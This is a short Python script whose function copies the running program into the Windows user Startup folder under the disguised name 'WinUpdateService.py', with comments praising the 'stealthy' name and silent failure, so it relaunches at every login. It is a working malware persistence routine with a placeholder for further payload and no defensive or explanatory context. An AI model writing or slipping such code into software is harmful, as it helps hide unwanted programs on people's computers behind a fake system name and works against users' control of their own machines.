import os
import shutil
import sys

def enable_persistence():
    # Get absolute path of the current running script/exe
    current_file_path = os.path.realpath(sys.argv[0])
    
    # Locate Windows Startup folder for the current user
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    
    # Define a stealthy name for the copied file
    target_filename = "WinUpdateService.py" 
    destination_path = os.path.join(startup_folder, target_filename)
    
    try:
        # Copy the file if it doesn't already exist in Startup folder
        if not os.path.exists(destination_path):
            shutil.copy2(current_file_path, destination_path)
            # Silent success
        else:
            pass
    except Exception:
        # Silent fail
        sys.exit(1)

if __name__ == "__main__":
    enable_persistence()
    # Main logic starts here
    print("Process initialized successfully.")